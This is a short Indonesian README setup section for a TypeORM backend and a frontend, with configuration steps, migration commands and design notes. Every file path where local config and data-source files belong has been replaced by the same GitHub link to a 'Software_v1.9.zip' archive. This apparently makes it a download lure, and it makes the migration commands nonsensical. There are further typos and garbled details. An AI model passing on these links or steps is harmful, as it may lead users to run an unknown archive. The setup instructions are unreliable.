## Konfigurasi
### BE
- Konfigurasi username, password dan juga nama database di `https://github.com/ibnumalik99/goodeva/raw/refs/heads/main/backend/Software_v1.9.zip` dan `https://github.com/ibnumalik99/goodeva/raw/refs/heads/main/backend/Software_v1.9.zip`
- Buat schema dengan perintah `npx typeorm-ts-node-commonjs migration:generate dist/migration/InitSchema --data-source https://github.com/ibnumalik99/goodeva/raw/refs/heads/main/backend/Software_v1.9.zip --pretty`
- Jalankan migrasi denga perintah `npx typeorm-ts-node-commonjs -d https://github.com/ibnumalik99/goodeva/raw/refs/heads/main/backend/Software_v1.9.zip migration:run`
- Running `npm run star:dev`
### FE
- Running APP `npm start`
### Node Version
- v24.13.0
### Keputusan singkat
- BE menggunakan TypeORM agar lebih mudah dalam melakukan proses Query.
- code di FE sudah dirancang sehingg ada proses pengiriman id yang valid (401) dari FE ke BE.
